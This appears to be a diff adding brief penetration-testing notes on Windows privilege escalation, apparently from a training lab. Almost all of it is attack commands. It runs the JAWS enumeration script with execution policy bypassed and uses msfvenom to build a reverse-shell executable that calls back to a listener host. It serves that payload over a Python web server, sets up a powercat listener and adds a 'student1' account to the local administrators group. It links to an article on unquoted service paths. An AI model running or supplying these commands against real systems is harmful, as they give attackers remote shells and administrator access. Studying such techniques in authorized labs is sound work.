@@ -1,0 +1,21 @@
+#Run from CMD:
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+
+
+#From Kali or ParrotOS
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.55 LPORT=1234 -f exe > abyss.exe
+
+#Run a web server
+Python -m SimpleHTTPServer
+
+powercat is a powershell function. First you need to load the function before you can execute it. You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.
+
+Import-module .\powercat.ps1
+Powercat -l -p 1234 -Verbose
+
+
+net localgroup administrators student1 /add
+
+
+read more on:
+https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
